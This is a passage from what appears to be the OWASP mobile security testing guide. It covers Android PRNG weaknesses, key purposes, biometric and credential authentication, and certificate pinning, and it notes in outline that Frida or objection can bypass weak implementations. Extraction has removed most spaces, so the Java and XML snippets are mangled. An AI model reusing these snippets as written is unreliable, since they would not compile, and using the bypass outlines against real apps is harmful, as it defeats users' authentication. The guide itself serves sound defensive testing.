java.util.Randomproducesanidenticalsequenceofnumbersforeachgivenseedvalue; consequently, the sequenceofnumbersispredictable. Insteadawell-vettedalgorithmshouldbechosenthatiscurrentlyconsideredtobe strongbyexpertsinthefield,andawell-testedimplementationswithadequatelengthseedsshouldbeused. IdentifyallinstancesofSecureRandomthatarenotcreatedusingthedefaultconstructor. Specifyingtheseedvaluemay reducerandomness. Prefertheno-argumentconstructorofSecureRandomthatusesthesystem-specifiedseedvalueto generatea128-byte-longrandomnumber. Ingeneral,ifaPRNGisnotadvertisedasbeingcryptographicallysecure(e.g.java.util.Random),thenitisprobablya statisticalPRNGandshouldnotbeusedinsecurity-sensitivecontexts. Pseudo-randomnumbergeneratorscanproduce predictablenumbersifthegeneratorisknownandtheseedcanbeguessed. A128-bitseedisagoodstartingpointfor producinga“randomenough”number. Onceanattackerknowswhattypeofweakpseudo-randomnumbergenerator(PRNG)isused,itcanbetrivialtowritea proof-of-concepttogeneratethenextrandomvaluebasedonpreviouslyobservedones,asitwasdoneforJavaRandom. In case of very weak custom random generators it may be possible to observe the pattern statistically. Although the recommendedapproachwouldanywaybetodecompiletheAPKandinspectthealgorithm(seeStaticAnalysis). Ifyouwanttotestforrandomness,youcantrytocapturealargesetofnumbersandcheckwiththeBurp’ssequencerto seehowgoodthequalityoftherandomnessis. Dynamic Analysis Youcanusemethodtracingonthementionedclassesandmethodstodetermineinput/outputvaluesbeingused. 225\nTesting the Purposes of Keys Platform: android MASVSV1: MSTG-CRYPTO-5 MASVSV2: MASVS-CRYPTO-2 Overview Static Analysis Identifyallinstanceswherecryptographyisused. Youcanlookfor: • classesCipher,Mac,MessageDigest,Signature • interfacesKey,PrivateKey,PublicKey,SecretKey • functionsgetInstance,generateKey • exceptionsKeyStoreException,CertificateException,NoSuchAlgorithmException • classesimportingjava.security.*,javax.crypto.*,android.security.*,android.security.keystore.* Foreachidentifiedinstance,identifyitspurposeanditstype. Itcanbeused: • forencryption/decryption-toensuredataconfidentiality • forsigning/verifying-toensureintegrityofdata(aswellasaccountabilityinsomecases) • formaintenance-toprotectkeysduringcertainsensitiveoperations(suchasbeingimportedtotheKeyStore) Additionally,youshouldidentifythebusinesslogicwhichusesidentifiedinstancesofcryptography. Duringverificationthefollowingchecksshouldbeperformed: • areallkeysusedaccordingtothepurposedefinedduringitscreation? (itisrelevanttoKeyStorekeys,whichcan haveKeyPropertiesdefined) • forasymmetrickeys,istheprivatekeybeingexclusivelyusedforsigningandthepublickeyencryption? • aresymmetrickeysusedformultiplepurposes? Anewsymmetrickeyshouldbegeneratedifit’susedinadifferent context. • iscryptographyusedaccordingtoitsbusinesspurpose? Dynamic Analysis Youcanusemethodtracingoncryptographicmethodstodetermineinput/outputvaluessuchasthekeysthatarebeing used. Monitor file system access while cryptographic operations are being performed to assess where key material is writtentoorreadfrom. Forexample,monitorthefilesystembyusingtheAPImonitorofRMS-RuntimeMobileSecurity. 226\nAndroid Local Authentication Overview During local authentication, an app authenticates the user against credentials stored locally on the device. In other words, the user “unlocks” the app or some inner layer of functionality by providing a valid PIN, password or biometric characteristics such as face or fingerprint, which is verified by referencing local data. Generally, this is done so that userscanmoreconvenientlyresumeanexistingsessionwitharemoteserviceorasameansofstep-upauthentication toprotectsomecriticalfunction. Asstatedbeforeinchapter“MobileAppAuthenticationArchitectures”: Thetestershouldbeawarethatlocalauthentica- tionshouldalwaysbeenforcedataremoteendpointorbasedonacryptographicprimitive. Attackerscaneasilybypass localauthenticationifnodatareturnsfromtheauthenticationprocess. OnAndroid,therearetwomechanismssupportedbytheAndroidRuntimeforlocalauthentication: theConfirmCredential flowandtheBiometricAuthenticationflow. Confirm Credential Flow TheconfirmcredentialflowisavailablesinceAndroid6.0andisusedtoensurethatusersdonothavetoenterapp-specific passwordstogetherwiththelockscreenprotection. Instead: ifauserhasloggedintothedevicerecently,thenconfirm- credentialscanbeusedtounlockcryptographicmaterialsfromtheAndroidKeystore. Thatis,iftheuserunlockedthe devicewithinthesettimelimits(setUserAuthenticationValidityDurationSeconds),otherwisethedeviceneedstobe unlockedagain. NotethatthesecurityofConfirmCredentialsisonlyasstrongastheprotectionsetatthelockscreen. Thisoftenmeans thatsimplepredictivelock-screenpatternsareusedandthereforewedonotrecommendanyappswhichrequireL2of securitycontrolstouseConfirmCredentials. Biometric Authentication Flow Biometricauthenticationisaconvenientmechanismforauthentication,butalsointroducesanadditionalattacksurface whenusingit. TheAndroiddeveloperdocumentationgivesaninterestingoverviewandindicatorsformeasuringbiometric unlocksecurity. TheAndroidplatformoffersthreedifferentclassesforbiometricauthentication: • Android10(APIlevel29)andhigher: BiometricManager • Android9(APIlevel28)andhigher: BiometricPrompt • Android6.0(APIlevel23)andhigher: FingerprintManager(deprecatedinAndroid9(APIlevel28)) 227\nTheclassBiometricManagercanbeusedtoverifyifbiometrichardwareisavailableonthedeviceandifit’sconfigured bytheuser. Ifthat’sthecase,theclassBiometricPromptcanbeusedtoshowasystem-providedbiometricdialog. TheBiometricPromptclassisasignificantimprovement,asitallowstohaveaconsistentUIforbiometricauthentication onAndroidandalsosupportsmoresensorsthanjustfingerprint. This is different to the FingerprintManager class which only supports fingerprint sensors and provides no UI, forcing developerstobuildtheirownfingerprintUI. AverydetailedoverviewandexplanationoftheBiometricAPIonAndroidwaspublishedontheAndroidDeveloperBlog. FingerprintManager (deprecated in Android 9 (API level 28)) Android 6.0 (API level 23) introduced public APIs for authenticating users via fingerprint, but is deprecated in Android 9 (API level 28). Access to the fingerprint hardware is provided through the FingerprintManager class. An app can request fingerprint authentication by instantiating aFingerprintManager object and calling its authenticate method. Thecallerregisterscallbackmethodstohandlepossibleoutcomesoftheauthenticationprocess(i.e.success,failure,or error). Notethatthismethoddoesn’tconstitutestrongproofthatfingerprintauthenticationhasactuallybeenperformed -forexample,theauthenticationstepcouldbepatchedoutbyanattacker,orthe“success”callbackcouldbeoverloaded usingdynamicinstrumentation. You can achieve better security by using the fingerprint API in conjunction with the Android KeyGenerator class. With thisapproach,asymmetrickeyisstoredintheAndroidKeyStoreandunlockedwiththeuser’sfingerprint. Forexample, to enable user access to a remote service, an AES key is created which encrypts the authentication token. By calling setUserAuthenticationRequired(true)whencreatingthekey,itisensuredthattheusermustre-authenticatetore- trieveit. Theencryptedauthenticationtokencanthenbesaveddirectlyonthedevice(e.g.viaSharedPreferences). This designisarelativelysafewaytoensuretheuseractuallyenteredanauthorizedfingerprint. Anevenmoresecureoptionisusingasymmetriccryptography. Here,themobileappcreatesanasymmetrickeypairin theKeyStoreandenrollsthepublickeyontheserverbackend. Latertransactionsarethensignedwiththeprivatekey andverifiedbytheserverusingthepublickey. 228\nBiometric Library AndroidprovidesalibrarycalledBiometricwhichoffersacompatibilityversionoftheBiometricPromptandBiometric- ManagerAPIs,asimplementedinAndroid10,withfullfeaturesupportbacktoAndroid6.0(API23). YoucanfindareferenceimplementationandinstructionsonhowtoshowabiometricauthenticationdialogintheAndroid developerdocumentation. There are two authenticate methods available in the BiometricPrompt class. One of them expects a CryptoObject, whichaddsanadditionallayerofsecurityforthebiometricauthentication. TheauthenticationflowwouldbeasfollowswhenusingCryptoObject: • TheappcreatesakeyintheKeyStorewithsetUserAuthenticationRequiredandsetInvalidatedByBiometri- cEnrollmentsettotrue. Additionally,setUserAuthenticationValidityDurationSecondsshouldbesetto-1. • Thiskeyisusedtoencryptinformationthatisauthenticatingtheuser(e.g.sessioninformationorauthentication token). • AvalidsetofbiometricsmustbepresentedbeforethekeyisreleasedfromtheKeyStoretodecryptthedata,which isvalidatedthroughtheauthenticatemethodandtheCryptoObject. • This solution cannot be bypassed, even on rooted devices, as the key from the KeyStore can only be used after successfulbiometricauthentication. If CryptoObject is not used as part of the authenticate method, it can be bypassed by using Frida. See the “Dynamic Instrumentation”sectionformoredetails. DeveloperscanuseseveralvalidationclassesofferedbyAndroidtotesttheimplementationofbiometricauthentication intheirapp. FingerprintManager ThissectiondescribeshowtoimplementbiometricauthenticationbyusingtheFingerprintManagerclass. Please keepinmindthatthisclassisdeprecatedandtheBiometriclibraryshouldbeusedinsteadasabestpractice. This sectionisjustforreference,incaseyoucomeacrosssuchanimplementationandneedtoanalyzeit. Begin by searching for FingerprintManager.authenticate calls. The first parameter passed to this method should be a CryptoObject instance which is a wrapper class for crypto objects supported by FingerprintManager. Should the parameterbesettonull,thismeansthefingerprintauthorizationispurelyevent-bound,likelycreatingasecurityissue. ThecreationofthekeyusedtoinitializethecipherwrappercanbetracedbacktotheCryptoObject. Verifythekeywas bothcreatedusingtheKeyGeneratorclassinadditiontosetUserAuthenticationRequired(true)beingcalledduring creationoftheKeyGenParameterSpecobject(seecodesamplesbelow). Makesuretoverifytheauthenticationlogic. Fortheauthenticationtobesuccessful,theremoteendpointmustrequire theclienttopresentthesecretretrievedfromtheKeyStore,avaluederivedfromthesecret,oravaluesignedwiththe clientprivatekey(seeabove). Safelyimplementingfingerprintauthenticationrequiresfollowingafewsimpleprinciples,startingbyfirstcheckingifthat typeofauthenticationisevenavailable. Onthemostbasicfront, thedevicemustrunAndroid6.0orhigher(API23+). Fourotherprerequisitesmustalsobeverified: • ThepermissionmustberequestedintheAndroidManifest: <uses-permission android:name="android.permission.USE_FINGERPRINT" /> • Fingerprinthardwaremustbeavailable: FingerprintManagerfingerprintManager =(FingerprintManager) context.getSystemService(Context.FINGERPRINT_SERVICE); fingerprintManager.isHardwareDetected(); • Theusermusthaveaprotectedlockscreen: KeyguardManagerkeyguardManager =(KeyguardManager)context.getSystemService(Context.KEYGUARD_SERVICE); keyguardManager.isKeyguardSecure(); //noteifthisisnotthecase:asktheusertosetupaprotectedlockscreen 229\n• Atleastonefingershouldberegistered: fingerprintManager.hasEnrolledFingerprints(); • Theapplicationshouldhavepermissiontoaskforauserfingerprint: context.checkSelfPermission(Manifest.permission.USE_FINGERPRINT)==PermissionResult.PERMISSION_GRANTED; Ifanyoftheabovechecksfail,theoptionforfingerprintauthenticationshouldnotbeoffered. ItisimportanttorememberthatnoteveryAndroiddeviceoffershardware-backedkeystorage. TheKeyInfoclasscanbe usedtofindoutwhetherthekeyresidesinsidesecurehardwaresuchasaTrustedExecutionEnvironment(TEE)orSecure Element(SE). SecretKeyFactoryfactory =SecretKeyFactory.getInstance(getEncryptionKey().getAlgorithm(),ANDROID_KEYSTORE); KeyInfosecetkeyInfo =(KeyInfo)factory.getKeySpec(yourencryptionkeyhere,KeyInfo.class); secetkeyInfo.isInsideSecureHardware() On certain systems, it is possible to enforce the policy for biometric authentication through hardware as well. This is checkedby: keyInfo.isUserAuthenticationRequirementEnforcedBySecureHardware(); Thefollowingdescribeshowtodofingerprintauthenticationusingasymmetrickeypair. Fingerprint authentication may be implemented by creating a new AES key using the KeyGenerator class by adding setUserAuthenticationRequired(true)inKeyGenParameterSpec.Builder. generator =KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES,KEYSTORE); generator.init(newKeyGenParameterSpec.Builder (KEY_ALIAS, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .setUserAuthenticationRequired(true) .build() ); generator.generateKey(); Toperformencryptionordecryptionwiththeprotectedkey,createaCipherobjectandinitializeitwiththekeyalias. SecretKeykeyspec =(SecretKey)keyStore.getKey(KEY_ALIAS,null); if(mode ==Cipher.ENCRYPT_MODE){ cipher.init(mode,keyspec); Keep in mind, a new key cannot be used immediately - it has to be authenticated through the FingerprintMan- ager first. This involves wrapping the Cipher object into FingerprintManager.CryptoObject which is passed to FingerprintManager.authenticatebeforeitwillberecognized. cryptoObject =newFingerprintManager.CryptoObject(cipher); fingerprintManager.authenticate(cryptoObject,newCancellationSignal(),0,this,null); The callback method onAuthenticationSucceeded(FingerprintManager.AuthenticationResult result) is called whentheauthenticationsucceeds. TheauthenticatedCryptoObjectcanthenberetrievedfromtheresult. public void authenticationSucceeded(FingerprintManager.AuthenticationResult result){ cipher =result.getCryptoObject().getCipher(); //(...dosomethingwiththeauthenticatedcipherobject...) } Thefollowingdescribeshowtodofingerprintauthenticationusinganasymmetrickeypair. To implement fingerprint authentication using asymmetric cryptography, first create a signing key using the KeyPair- Generatorclass,andenrollthepublickeywiththeserver. Youcanthenauthenticatepiecesofdatabysigningthemon 230\ntheclientandverifyingthesignatureontheserver. Adetailedexampleforauthenticatingtoremoteserversusingthe fingerprintAPIcanbefoundintheAndroidDevelopersBlog. Akeypairisgeneratedasfollows: KeyPairGenerator.getInstance(KeyProperties.KEY_ALGORITHM_EC,"AndroidKeyStore"); keyPairGenerator.initialize( newKeyGenParameterSpec.Builder(MY_KEY, KeyProperties.PURPOSE_SIGN) .setDigests(KeyProperties.DIGEST_SHA256) .setAlgorithmParameterSpec(newECGenParameterSpec("secp256r1")) .setUserAuthenticationRequired(true) .build()); keyPairGenerator.generateKeyPair(); Tousethekeyforsigning,youneedtoinstantiateaCryptoObjectandauthenticateitthroughFingerprintManager. Signature.getInstance("SHA256withECDSA"); KeyStorekeyStore =KeyStore.getInstance("AndroidKeyStore"); keyStore.load(null); PrivateKeykey =(PrivateKey)keyStore.getKey(MY_KEY,null); signature.initSign(key); CryptoObjectcryptoObject =newFingerprintManager.CryptoObject(signature); CancellationSignalcancellationSignal =newCancellationSignal(); FingerprintManagerfingerprintManager = context.getSystemService(FingerprintManager.class); fingerprintManager.authenticate(cryptoObject,cancellationSignal,0,this,null); YoucannowsignthecontentsofabytearrayinputBytesasfollows. Signaturesignature =cryptoObject.getSignature(); signature.update(inputBytes); byte[]signed =signature.sign(); • Notethatincaseswheretransactionsaresigned,arandomnonceshouldbegeneratedandaddedtothesigned data. Otherwise,anattackercouldreplaythetransaction. • Toimplementauthenticationusingsymmetricfingerprintauthentication,useachallenge-responseprotocol. Additional Security Features Android 7.0 (API level 24) adds the setInvalidatedByBiometricEnrollment(boolean invalidateKey) method to KeyGenParameterSpec.Builder. When invalidateKey value is set to true (the default), keys that are valid for fingerprintauthenticationareirreversiblyinvalidatedwhenanewfingerprintisenrolled. Thispreventsanattackerfrom retrievingtheykeyeveniftheyareabletoenrollanadditionalfingerprint. Android8.0(APIlevel26)addstwoadditionalerrorcodes: • FINGERPRINT_ERROR_LOCKOUT_PERMANENT:Theuserhastriedtoomanytimestounlocktheirdeviceusingthefin- gerprintreader. • FINGERPRINT_ERROR_VENDOR:Avendor-specificfingerprintreadererroroccurred. Implementing biometric authentication Reassurethatthelockscreenisset: KeyguardManagermKeyguardManager =(KeyguardManager)getSystemService(Context.KEYGUARD_SERVICE); if(!mKeyguardManager.isKeyguardSecure()){ //Showamessagethattheuserhasn'tsetupalockscreen. } • Createthekeyprotectedbythelockscreen. Inordertousethiskey,theuserneedstohaveunlockedthedevice inthelastXseconds,orthedeviceneedstobeunlockedagain. Makesurethatthistimeoutisnottoolong,asit becomeshardertoensurethatitwasthesameuserusingtheappastheuserunlockingthedevice: 231\ntry{ KeyStorekeyStore =KeyStore.getInstance("AndroidKeyStore"); keyStore.load(null); KeyGeneratorkeyGenerator =KeyGenerator.getInstance( KeyProperties.KEY_ALGORITHM_AES,"AndroidKeyStore"); //Set thealiasoftheentryinAndroidKeyStorewherethekeywillappear //and theconstrains(purposes)intheconstructoroftheBuilder keyGenerator.init(newKeyGenParameterSpec.Builder(KEY_NAME, KeyProperties.PURPOSE_ENCRYPT |KeyProperties.PURPOSE_DECRYPT) .setBlockModes(KeyProperties.BLOCK_MODE_CBC) .setUserAuthenticationRequired(true) //Require thattheuserhasunlockedinthelast30seconds .setUserAuthenticationValidityDurationSeconds(30) .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_PKCS7) .build()); keyGenerator.generateKey(); }catch (NoSuchAlgorithmException |NoSuchProviderException |InvalidAlgorithmParameterException |KeyStoreException |CertificateException |IOExceptione){ throw newRuntimeException("Failedtocreateasymmetrickey",e); } • Setupthelockscreentoconfirm: private static final intREQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS =1;//usedasanumbertoverifywhetherthisiswheretheactivityresultsfrom Intentintent =mKeyguardManager.createConfirmDeviceCredentialIntent(null,null); if(intent !=null){ startActivityForResult(intent,REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS); } • Usethekeyafterlockscreen: @Override protected void onActivityResult(intrequestCode,intresultCode,Intentdata){ if(requestCode ==REQUEST_CODE_CONFIRM_DEVICE_CREDENTIALS){ //Challenge completed,proceedwithusingcipher if(resultCode ==RESULT_OK){ //usethe keyfortheactualauthenticationflow }else { //The usercanceledordidn’tcompletethelockscreen //operation. Gotoerror/cancellationflow. } } } Third party SDKs Make sure that fingerprint authentication and/or other types of biometric authentication are exclusively based on the AndroidSDKanditsAPIs. Ifthisisnotthecase,ensurethatthealternativeSDKhasbeenproperlyvettedforanyweak- nesses. MakesurethattheSDKisbackedbytheTEE/SEwhichunlocksa(cryptographic)secretbasedonthebiometric authentication. Thissecretshouldnotbeunlockedbyanythingelse,butavalidbiometricentry. Thatway,itshouldnever bethecasethatthefingerprintlogiccanbebypassed. Testing Biometric Authentication Platform: android MASVSV1: MSTG-AUTH-8 MASVSV2: MASVS-AUTH-2 Overview Static Analysis Note that there are quite some vendor/third party SDKs, which provide biometric support, but which have their own insecurities. BeverycautiouswhenusingthirdpartySDKstohandlesensitiveauthenticationlogic. 232\nDynamic Analysis Please take a look at this detailed blog article about the Android KeyStore and Biometric authentication. This research includes two Frida scripts which can be used to test insecure implementations of biometric authentication and try to bypassthem: • Fingerprintbypass: ThisFridascriptwillbypassauthenticationwhentheCryptoObjectisnotusedintheauthen- ticate method of the BiometricPrompt class. The authentication implementation relies on the callback onAu- thenticationSuccededbeingcalled. • Fingerprintbypassviaexceptionhandling: ThisFridascriptwillattempttobypassauthenticationwhentheCryp- toObjectisused,butusedinanincorrectway. Thedetailedexplanationcanbefoundinthesection“CryptoObject ExceptionHandling”intheblogpost. Testing Confirm Credentials Platform: android MASVSV1: MSTG-AUTH-1,MSTG-STORAGE-11 MASVSV2: MASVS-AUTH-2 Overview Static Analysis Makesurethattheunlockedkeyisusedduringtheapplicationflow. Forexample,thekeymaybeusedtodecryptlocal storageoramessagereceivedfromaremoteendpoint. Iftheapplicationsimplycheckswhethertheuserhasunlocked thekeyornot,theapplicationmaybevulnerabletoalocalauthenticationbypass. Dynamic Analysis Validatethedurationoftime(seconds)forwhichthekeyisauthorizedtobeusedaftertheuserissuccessfullyauthenti- cated. ThisisonlyneededifsetUserAuthenticationRequiredisused. 233\nAndroid Network Communication Overview AlmosteveryAndroidappactsasaclienttooneormoreremoteservices. Asthisnetworkcommunicationusuallytakes placeoveruntrustednetworkssuchaspublicWi-Fi,classicalnetworkbased-attacksbecomeapotentialissue. Most modern mobile apps use variants of HTTP-based web services, as these protocols are well-documented and sup- ported. Android Network Security Configuration Starting on Android 7.0 (API level 24), Android apps can customize their network security settings using the so-called NetworkSecurityConfigurationfeaturewhichoffersthefollowingkeycapabilities: • Cleartexttraffic: Protectappsfromaccidentalusageofcleartexttraffic(orenablesit). • Customtrustanchors: CustomizewhichCertificateAuthorities(CAs)aretrustedforanapp’ssecureconnections. Forexample,trustingparticularself-signedcertificatesorrestrictingthesetofpublicCAsthattheapptrusts. • Certificatepinning: Restrictanapp’ssecureconnectiontoparticularcertificates. • Debug-onlyoverrides: Safelydebugsecureconnectionsinanappwithoutaddedrisktotheinstalledbase. If an app defines a custom Network Security Configuration, you can obtain its location by searching for an- droid:networkSecurityConfigintheAndroidManifest.xmlfile. <application android:networkSecurityConfig="@xml/network_security_config" Inthiscasethefileislocatedat@xml(equivalentto/res/xml)andhasthename“network_security_config”(whichmight vary). Youshouldbeabletofinditas“res/xml/network_security_config.xml”. Ifaconfigurationexists,thefollowingevent shouldbevisibleinthesystemlogs: D/NetworkSecurityConfig:UsingNetworkSecurityConfigfromresourcenetwork_security_config TheNetworkSecurityConfigurationisXML-basedandcanbeusedtoconfigureapp-wideanddomain-specificsettings: • base-configappliestoallconnectionsthattheappattemptstomake. • domain-configoverridesbase-configforspecificdomains(itcancontainmultipledomainentries). Forexample,thefollowingconfigurationusesthebase-configtopreventcleartexttrafficforalldomains. Butitoverrides thatruleusingadomain-config,explicitlyallowingcleartexttrafficforlocalhost. <?xml version="1.0" encoding="utf-8"?> <network-security-config> <base-config cleartextTrafficPermitted="false" /> <domain-config cleartextTrafficPermitted="true"> <domain>localhost</domain> </domain-config> </network-security-config> Learnmore: • “ASecurityAnalyst’sGuidetoNetworkSecurityConfigurationinAndroidP” • AndroidDevelopers-NetworkSecurityConfiguration • AndroidCodelab-NetworkSecurityConfiguration Default Configurations ThedefaultconfigurationforappstargetingAndroid9(APIlevel28)andhigherisasfollows: 234\n<base-config cleartextTrafficPermitted="false"> <trust-anchors> <certificates src="system" /> </trust-anchors> </base-config> ThedefaultconfigurationforappstargetingAndroid7.0(APIlevel24)toAndroid8.1(APIlevel27)isasfollows: <base-config cleartextTrafficPermitted="true"> <trust-anchors> <certificates src="system" /> </trust-anchors> </base-config> ThedefaultconfigurationforappstargetingAndroid6.0(APIlevel23)andlowerisasfollows: <base-config cleartextTrafficPermitted="true"> <trust-anchors> <certificates src="system" /> <certificates src="user" /> </trust-anchors> </base-config> Certificate Pinning The Network Security Configuration can also be used to pin declarative certificates to specific domains. This is done by providing a <pin-set> in the Network Security Configuration, which is a set of digests (hashes) of the public key (SubjectPublicKeyInfo)ofthecorrespondingX.509certificate. Whenattemptingtoestablishaconnectiontoaremoteendpoint,thesystemwill: • Getandvalidatetheincomingcertificate. • Extractthepublickey. • Calculateadigestovertheextractedpublickey. • Comparethedigestwiththesetoflocalpins. If at least one of the pinned digests matches, the certificate chain will be considered valid and the connection will pro- ceed. <?xml version="1.0" encoding="utf-8"?> <network-security-config> <domain-config> UsecertificatepinningforOWASPwebsiteaccessincludingsubdomains <domain includeSubdomains="true">owasp.org</domain> <pin-set expiration="2018/8/10"> <!--Hashofthepublickey(SubjectPublicKeyInfooftheX.509certificate)of theIntermediateCAoftheOWASPwebsiteservercertificate--> <pindigest="SHA-256">YLh1dUR9y6Kja30RrAn7JKnbQG/uEtLMkBgFF2Fuihg=</pin> <!--Hashofthepublickey(SubjectPublicKeyInfooftheX.509certificate)of theRootCAoftheOWASPwebsiteservercertificate--> <pindigest="SHA-256">Vjs8r4z+80wjNcr1YKepWQboSIRi63WsWXhIMN+eWys=</pin> </pin-set> </domain-config> </network-security-config> Security Provider AndroidreliesonasecurityprovidertoprovideSSL/TLS-basedconnections. Theproblemwiththiskindofsecurityprovider (oneexampleisOpenSSL),whichcomeswiththedevice,isthatitoftenhasbugsand/orvulnerabilities. Toavoidknownvulnerabilities, developersneedtomakesurethattheapplicationwillinstallapropersecurityprovider. SinceJuly11, 2016, GooglehasbeenrejectingPlayStoreapplicationsubmissions(bothnewapplicationsandupdates) thatusevulnerableversionsofOpenSSL. Testing Custom Certificate Stores and Certificate Pinning 235\nPlatform: android MASVSV1: MSTG-NETWORK-4 MASVSV2: MASVS-NETWORK-2 Overview Static Analysis Network Security Configuration InspecttheNetworkSecurityConfigurationlookingforany<pin-set>elements. Checktheirexpirationdate,ifany. If expired,certificatepinningwillbedisabledfortheaffecteddomains. TestingTip: Ifacertificatepinningvalidationcheckhasfailed,thefollowingeventshouldbeloggedinthesystem logs: I/X509Util:Failedtovalidatethecertificatechain,error:Pinverificationfailed TrustManager Implementingcertificatepinninginvolvesthreemainsteps: • Obtainthecertificateofthedesiredhost(s). • Makesurethecertificateisin.bksformat. • PinthecertificatetoaninstanceofthedefaultApacheHttpclient. Toanalyzethecorrectimplementationofcertificatepinning,theHTTPclientshouldloadtheKeyStore: InputStreamin =resources.openRawResource(certificateRawResource); keyStore =KeyStore.getInstance("BKS"); keyStore.load(resourceStream,password); OncetheKeyStorehasbeenloaded,wecanusetheTrustManagerthattruststheCAsinourKeyStore: StringtmfAlgorithm =TrustManagerFactory.getDefaultAlgorithm(); TrustManagerFactorytmf =TrustManagerFactory.getInstance(tmfAlgorithm); tmf.init(keyStore); //CreateanSSLContextthatusestheTrustManager //SSLContextcontext=SSLContext.getInstance("TLS"); sslContext.init(null,tmf.getTrustManagers(),null); Theapp’simplementationmaybedifferent, pinningagainstthecertificate’spublickeyonly, thewholecertificate, ora wholecertificatechain. Network Libraries and WebViews Applicationsthatusethird-partynetworkinglibrariesmayutilizethelibraries’certificatepinningfunctionality. Forexample, okhttpcanbesetupwiththeCertificatePinnerasfollows: OkHttpClientclient =newOkHttpClient.Builder() .certificatePinner(newCertificatePinner.Builder() .add("example.com","sha256/UwQAapahrjCOjYI3oLUx5AQxPBR02Jz6/E2pt0IeLXA=") .build()) .build(); ApplicationsthatuseaWebViewcomponentmayutilizetheWebViewClient’seventhandlerforsomekindof“certificate pinning”ofeachrequestbeforethetargetresourceisloaded. Thefollowingcodeshowsanexampleverification: 236\nWebViewmyWebView =(WebView)findViewById(R.id.webview); myWebView.setWebViewClient(newWebViewClient(){ private StringexpectedIssuerDN ="CN=Let'sEncryptAuthorityX3,O=Let'sEncrypt,C=US;"; @Override public void onLoadResource(WebViewview,Stringurl) { //FromAndroidAPIdocumentationabout"WebView.getCertificate()": //GetstheSSLcertificateforthemaintop-levelpage //ornullifthereisnocertificate(thesiteisnotsecure). // //AvailableinformationonSslCertificateclassare"IssuerDN","SubjectDN"andvaliditydatehelpers SslCertificateserverCert =view.getCertificate(); if(serverCert !=null){ //applyeithercertificateorpublickeypinningcomparisonhere //Throwexceptiontocancelresourceloading... } } } }); Alternatively, itisbettertouseanOkHttpClientwithconfiguredpinsandletitactasaproxyoverridingshouldInter- ceptRequestoftheWebViewClient. Xamarin Applications ApplicationsdevelopedinXamarinwilltypicallyuseServicePointManagertoimplementpinning. Normallyafunctioniscreatedtocheckthecertificate(s)andreturnthebooleanvaluetothemethodServerCertificat- eValidationCallback: [Activity(Label ="XamarinPinning",MainLauncher =true)] public class MainActivity :Activity { //SupportedPublicKey-Hexadecimalvalueofthepublickey. //UseGetPublicKeyString()methodtodeterminethepublickeyofthecertificatewewanttopin.Uncommentthedebugcode inthe ↪ ValidateServerCertificatefunctionafirsttimetodeterminethevaluetopin. private const string SupportedPublicKey ="3082010A02820101009CD30CF05AE52E47B7725D3783B...";//Shortened forreadability private static bool ValidateServerCertificate( object sender, X509Certificatecertificate, X509Chainchain, SslPolicyErrorssslPolicyErrors ) { //Log.Debug("XamarinPinning",chain.ChainElements[X].Certificate.GetPublicKeyString()); //returntrue; return SupportedPublicKey ==chain.ChainElements[1].Certificate.GetPublicKeyString(); } protected override void OnCreate(BundlesavedInstanceState) { System.Net.ServicePointManager.ServerCertificateValidationCallback +=ValidateServerCertificate; base.OnCreate(savedInstanceState); SetContentView(Resource.Layout.Main); TesteAsync("https://security.claudio.pt"); } InthisparticularexamplewearepinningtheintermediateCAofthecertificatechain. TheoutputoftheHTTPresponse willbeavailableinthesystemlogs. SampleXamarinappwiththepreviousexamplecanbeobtainedontheMASTGrepository After decompressing the APK file, use a .NET decompiler like dotPeak, ILSpy or dnSpy to decompile the app dlls stored insidethe‘Assemblies’folderandconfirmtheusageoftheServicePointManager. Learnmore: • Certificate and Public Key Pinning with Xamarin - https://thomasbandt.com/certificate-and-public-key-pinning- with-xamarin • ServicePointManager-https://msdn.microsoft.com/en-us/library/system.net.servicepointmanager(v=vs.110).aspx Cordova Applications 237\nHybrid applications based on Cordova do not support Certificate Pinning natively, so plugins are used to achieve this. The most common one is PhoneGap SSL Certificate Checker. The check method is used to confirm the fingerprint and callbackswilldeterminethenextsteps. //Endpointtoverifyagainstcertificatepinning. varserver ="https://www.owasp.org"; //SHA256Fingerprint(Canbeobtainedvia"openssls_client-connecthostname:443|opensslx509-noout-fingerprint-sha256" varfingerprint ="D8EF3CDF7EF644BA04ECD59714BB004A7AF52663 53874E766777F0F4CCED67B9"; window.plugins.sslCertificateChecker.check( successCallback, errorCallback, server, fingerprint); function successCallback(message){ alert(message); //Messageisalways:CONNECTION_SECURE. //Nowdosomethingwiththetrustedserver. } function errorCallback(message){ alert(message); if(message ==="CONNECTION_NOT_SECURE"){ //Thereislikelyamaninthemiddleattackgoingon,becareful! }else if(message.indexOf("CONNECTION_FAILED")>-1){ //Therewasnoconnection(yet).Internetmaybedown.Tryagain(afewtimes)afteralittletimeout. } } AfterdecompressingtheAPKfile,Cordova/Phonegapfileswillbelocatedinthe/assets/wwwfolder. The‘plugins’folderwill giveyouthevisibilityofthepluginsused. WewillneedtosearchforthismethodsintheJavaScriptcodeoftheapplication toconfirmitsusage. Dynamic Analysis Followtheinstructionsfrom“TestingEndpointIdentifyVerification>DynamicAnalysis”. Ifdoingsodoesn’tleadtotraffic beingproxied,itmaymeanthatcertificatepinningisactuallyimplementedandallsecuritymeasuresareinplace. Does thesamehappenforalldomains? As a quick smoke test, you can try to bypass certificate pinning using objection as described in “Bypassing Certificate Pinning”. PinningrelatedAPIsbeinghookedbyobjectionshouldappearinobjection’soutput. However,keepinmindthat: • theAPIsmightnotbecomplete. • ifnothingishooked,thatdoesn’tnecessarilymeanthattheappdoesn’timplementpinning. Inbothcases,theapporsomeofitscomponentsmightimplementcustompinninginawaythatissupportedbyobjection. Pleasecheckthestaticanalysissectionforspecificpinningindicatorsandmorein-depthtesting. 238\nTesting Endpoint Identify Verification Platform: android MASVSV1: MSTG-NETWORK-3 MASVSV2: MASVS-NETWORK-1 Overview Static Analysis UsingTLStotransportsensitiveinformationoverthenetworkisessentialforsecurity. However,encryptingcommunication betweenamobileapplicationanditsbackendAPIisnottrivial. Developersoftendecideonsimplerbutlesssecuresolutions 